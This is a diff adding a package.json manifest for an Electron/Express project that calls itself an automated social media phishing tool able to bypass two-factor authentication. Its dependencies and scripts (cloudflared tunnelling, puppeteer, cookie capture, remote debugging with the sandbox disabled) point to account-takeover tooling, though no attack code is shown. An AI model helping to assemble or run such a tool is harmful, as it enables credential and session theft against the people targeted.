@@ -1,0 +1,48 @@
+{
+	"name": "cyberforq",
+	"version": "1.2.0",
+	"description": "Automated Social Media Phishing Tool. Automated tool that allow us to hack accounts with 2FA Bypass.",
+	"main": "server.js",
+	"scripts": {
+		"test": "electron test.js",
+		"start": "node ./utils/banner.js && electron --remote-debugging-port=6450 --no-sandbox .",
+		"headless": "node ./utils/banner.js && electron --remote-debugging-port=6450 --no-sandbox --headless ."
+	},
+	"repository": {
+		"type": "git",
+		"url": "git+https://github.com/kaushiktarun05/cyberforQ.git"
+	},
+	"keywords": [
+		"phishing tool",
+		"tarunkaushik",
+		"mightyrock05",
+		"cyberforQ"
+	],
+	"author": "Tarun Kaushik",
+	"autherWebsite": "https://tarunkaushik.tech",
+	"license": "ISC",
+	"bugs": {
+		"url": "https://github.com/kaushiktarun05/cyberforQ/issues"
+	},
+	"homepage": "https://github.com/kaushiktarun05/cyberforQ#readme",
+	"dependencies": {
+		"adm-zip": "^0.5.10",
+		"axios": "^1.6.7",
+		"cheerio": "^1.0.0-rc.12",
+		"cloudflared": "^0.5.1",
+		"cookie-parser": "^1.4.6",
+		"ejs": "^3.1.9",
+		"electron": "^28.3.3",
+		"express": "^4.18.2",
+		"express-device": "^0.4.2",
+		"express-fileupload": "^1.4.3",
+		"ipware": "^2.0.0",
+		"octavia-db": "^1.0.0",
+		"puppeteer-core": "^22.1.0",
+		"socket.io": "^4.7.4",
+		"uuid": "^9.0.1"
+	},
+	"devDependencies": {
+		"nodemon": "^3.0.3"
+	}
+}
